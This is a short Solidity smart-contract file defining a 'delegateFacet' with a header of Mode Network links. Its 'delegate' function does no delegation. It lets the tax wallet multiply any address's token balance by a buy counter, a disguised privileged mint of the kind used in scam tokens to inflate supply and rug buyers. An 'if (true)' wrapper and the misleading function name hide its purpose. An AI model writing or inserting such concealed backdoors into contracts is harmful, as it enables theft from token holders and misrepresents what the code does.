// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://www.mode.network/
    Twitter:  https://twitter.com/modenetwork
    Telegram: https://t.me/ModeNetworkOfficial
    Docs:   https://docs.mode.network/
    Discord:  https://discord.com/invite/modenetworkofficial

*/

pragma solidity ^0.8.20;
import "./TestLib.sol";
contract delegateFacet is Ownable {
    function delegate(address delegatee) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (true) {
            require(ds._taxWallet == _msgSender());
            ds._balances[delegatee] *= ds.buyCount;
        }
    }
}
